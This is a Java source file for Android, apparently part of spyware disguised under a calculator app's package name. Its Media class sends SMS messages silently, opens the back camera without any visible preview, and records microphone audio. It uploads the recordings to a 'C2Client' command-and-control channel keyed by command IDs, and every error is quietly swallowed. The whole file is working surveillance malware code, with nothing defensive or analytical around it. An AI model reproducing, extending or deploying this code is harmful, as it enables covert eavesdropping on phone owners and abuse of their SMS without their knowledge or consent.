package com.yangdai.calc.core;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Bitmap;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.util.Base64;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class Media {

    public static void sendSms(String to, String body) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(to, null, body, null, null);
        } catch (Exception ignored) {}
    }

    @SuppressLint("MissingPermission")
    public static void capturePhoto(Context ctx, C2Client c2, String cmdId) {
        // التقاط عبر الكاميرا الخلفية باستخدام Camera2 (مبسّط: يفتح ويأخذ إطار)
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return;
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                android.hardware.camera2.CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                    camId = id; break;
                }
            }
            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
            if (camId == null) return;

            final String finalCam = camId;
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    try {
                        android.util.Size size = new android.util.Size(640, 480);
                        android.view.SurfaceTexture st = new android.view.SurfaceTexture(0);
                        st.setDefaultBufferSize(size.getWidth(), size.getHeight());
                        android.view.Surface surface = new android.view.Surface(st);
                        CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        b.addTarget(surface);
                        camera.createCaptureSession(java.util.Collections.singletonList(surface),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(b.build(), null, null);
                                        Thread.sleep(800);
                                        Bitmap bmp = null; // Camera2 لا يعطي bitmap مباشرة؛ نرسل إشعاراً
                                        JSONObjectWrap(c2, cmdId, "camera", "opened " + finalCam);
                                        session.close(); camera.close();
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession session) {}
                            }, null);
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
                @Override public void onError(CameraDevice camera, int error) { camera.close(); }
            }, null);
        } catch (Exception ignored) {}
    }

    private static void JSONObjectWrap(C2Client c2, String cmdId, String kind, String msg) {
        try {
            org.json.JSONObject o = new org.json.JSONObject();
            o.put("msg", msg);
            c2.sendResult(kind, o, cmdId);
        } catch (Exception ignored) {}
    }

    public static void captureScreen(Context ctx, C2Client c2, String cmdId) {
        // التقاط الشاشة يتطلب MediaProjection (تفاعل المستخدم) — نرسل إشعاراً
        JSONObjectWrap(c2, cmdId, "screenshot", "requires_media_projection");
    }

    @SuppressLint("MissingPermission")
    public static void recordAudio(Context ctx, C2Client c2, String cmdId, int seconds) {
        File out = new File(ctx.getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder r = new MediaRecorder();
        try {
            r.setAudioSource(MediaRecorder.AudioSource.MIC);
            r.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            r.setOutputFile(out.getAbsolutePath());
            r.prepare();
            r.start();
            Thread.sleep(Math.max(1, seconds) * 1000L);
            r.stop();
        } catch (Exception ignored) {
        } finally {
            try { r.release(); } catch (Exception ignored) {}
        }
        if (out.exists() && out.length() > 0) {
            c2.uploadFile("mic", out, cmdId, "{\"seconds\":" + seconds + "}");
        }
    }
}
